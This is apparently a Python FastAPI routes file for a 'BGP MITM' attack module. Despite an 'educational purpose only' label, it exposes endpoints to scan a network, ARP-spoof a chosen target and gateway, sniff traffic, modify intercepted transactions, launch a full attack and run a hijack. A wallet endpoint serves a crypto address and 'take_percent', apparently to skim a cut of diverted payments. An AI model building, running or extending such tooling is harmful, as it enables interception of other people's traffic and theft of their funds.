"""
from ..security.auth import secure_endpoint
BGP MITM API Routes - Julius Project
Educational purpose only - Use in your own lab
"""

import os
import json
from pathlib import Path
from dotenv import load_dotenv

from fastapi import APIRouter, HTTPException, BackgroundTasks, Request
from pydantic import BaseModel
from typing import List, Optional
import threading

from ..security.auth import secure_endpoint
from ..services.bgp_mitm import (
    scan_network,
    get_gateway,
    arp_spoof,
    start_sniffer,
    start_modifier,
    start_dns_spoof,
    run_bgp_simulation,
    run_attack,
    run_high_hijack,
    stop_high_hijack,
)

# Load environment variables
load_dotenv()

router = APIRouter(prefix="/api/bgp-mitm", tags=["BGP MITM"])

# Get wallet from .env
ENV_WALLET = os.getenv("MONERO_WALLET_ADDRESS") or os.getenv("TEST_WALLET")
ENV_WALLET_TYPE = os.getenv("WALLET_TYPE", "monero")

class ScanRequest(BaseModel):
    ip_range: str = "192.168.1.0/24"

class SpoofRequest(BaseModel):
    target: str
    gateway: str
    interface: str = "eth0"

class SniffRequest(BaseModel):
    interface: str = "eth0"
    timeout: Optional[int] = None

class AttackRequest(BaseModel):
    target: str
    gateway: str
    interface: str = "eth0"

@router.get("/gateway")
async def get_gateway_info():
    gateway = get_gateway()
    if gateway:
        return {"gateway": gateway}
    raise HTTPException(status_code=404, detail="Gateway not found")

@router.post("/scan", response_model=List[str])
async def scan(request: ScanRequest):
    hosts = scan_network(request.ip_range)
    return hosts

@router.post("/spoof")
async def spoof(request: SpoofRequest):
    def run_spoof():
        arp_spoof(request.target, request.gateway, request.interface)
    thread = threading.Thread(target=run_spoof, daemon=True)
    thread.start()
    return {"status": "started", "target": request.target, "gateway": request.gateway}

@router.post("/sniff")
async def sniff_packets(request: SniffRequest):
    def run_sniff():
        start_sniffer(request.interface, request.timeout)
    thread = threading.Thread(target=run_sniff, daemon=True)
    thread.start()
    return {"status": "started", "interface": request.interface}

@router.post("/modify")
async def modify_transactions(request: SniffRequest):
    def run_modify():
        start_modifier(request.interface)
    thread = threading.Thread(target=run_modify, daemon=True)
    thread.start()
    return {"status": "started", "interface": request.interface}

@router.post("/attack")
async def full_attack(request: AttackRequest):
    def run_full():
        run_attack(request.target, request.gateway, request.interface)
    thread = threading.Thread(target=run_full, daemon=True)
    thread.start()
    return {"status": "started", "target": request.target, "gateway": request.gateway}

@router.get("/simulate-bgp")
async def simulate_bgp():
    try:
        result = run_bgp_simulation()
        return result
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@router.post("/hijack/start")
async def start_hijack():
    try:
        result = run_high_hijack()
        return result
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@router.post("/hijack/stop")
async def stop_hijack():
    try:
        result = stop_high_hijack()
        return result
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@router.get("/wallet")
async def get_wallet():
    """Get wallet from .env first, fallback to config.json"""
    # Try .env first
    if ENV_WALLET:
        return {
            "address": ENV_WALLET,
            "type": ENV_WALLET_TYPE,
            "take_percent": float(os.getenv("TAKE_PERCENT", 1)),
            "source": ".env"
        }
    
    # Fallback to config.json
    config_file = Path(__file__).resolve().parent.parent.parent / "config.json"
    if config_file.exists():
        with open(config_file, "r") as f:
            config = json.load(f)
            wallet = config.get("bgp_mitm", {}).get("test_wallet", "No wallet configured")
            wallet_type = config.get("bgp_mitm", {}).get("wallet_type", "bitcoin")
            return {
                "address": wallet,
                "type": wallet_type,
                "take_percent": config.get("bgp_mitm", {}).get("take_percent", 1),
                "source": "config.json"
            }
    
    return {"address": "No wallet configured", "source": "none"}

@router.post("/stop")
async def stop_all():
    return {"status": "stopped", "message": "All processes stopped (placeholder)"}

@router.get("/logs/modifications")
@secure_endpoint
async def get_modifications(request: Request, limit: int = 50):
    from pathlib import Path
    BASE_DIR = Path(__file__).resolve().parent.parent.parent
    log_path = BASE_DIR / "data" / "bgp_mitm_logs" / "modifications.log"
    if not log_path.exists():
        return {"entries": []}
    with open(log_path, "r") as f:
        lines = f.readlines()
    entries = [line.strip() for line in lines[-limit:][::-1] if line.strip()]
    return {"entries": entries}
